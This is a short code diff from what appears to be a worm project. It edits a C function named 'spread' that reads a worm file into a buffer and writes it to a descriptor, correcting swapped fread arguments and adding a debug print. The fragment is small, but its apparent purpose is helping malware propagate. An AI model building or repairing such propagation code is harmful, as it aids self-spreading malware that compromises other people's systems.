@@ -75,8 +75,9 @@ int spread(int fd, const char *worm, const char *dest) {
     return -1;
   }
 
-  while((read_bytes = fread(buffer, sizeof buffer, sizeof(char), fp)) > 0) {
+  while((read_bytes = fread(buffer, sizeof(char), sizeof buffer, fp)) > 0) {
     write(datafd, buffer, read_bytes);
+    fprintf(stdout, "%d bytes wrotten\n", read_bytes);
   }
 
   close(datafd);
